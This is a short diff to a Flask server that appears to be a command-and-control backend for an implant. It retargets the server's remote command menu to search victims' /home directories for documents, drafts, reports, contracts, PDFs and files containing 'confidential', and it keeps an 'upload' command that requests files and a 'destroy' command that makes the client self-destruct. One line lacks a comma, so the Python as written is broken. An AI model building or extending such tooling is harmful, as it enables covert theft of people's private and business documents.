@@ -13,10 +13,13 @@ app = Flask(__name__)
 
 # Predefined command menu
 command_menu = {
-    0: 'ls -lah',
-    1: 'cat /etc/passwd',
-    2: 'upload',
-    3: 'destroy', # Special non-Linux command that causes client to self-destruct
+    0: "find /home -iname '*.doc*' -o -iname '*.odt' -o -iname '*.txt'"
+    1: "find /home -iname '*draft*' -o -iname '*report*'"
+    2: "find /home -iname '*contract*' -o -iname '*.pdf'"
+    3: "grep -ril 'confidential' /home"
+    4: 'upload', # Special non-Linux command that requests specific files
+    5: 'destroy', # Special non-Linux command that causes client to self-destruct
+    6: "ls -la" # For testing
 }
 
 
@@ -75,7 +78,7 @@ def send_public_key():
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
 def assign_command(cmd_index):
     if 0 <= cmd_index < len(command_menu):
-        if cmd_index == 2:
+        if cmd_index == 4:
             data = request.get_json()
             path = data.get('path')
             if not path:
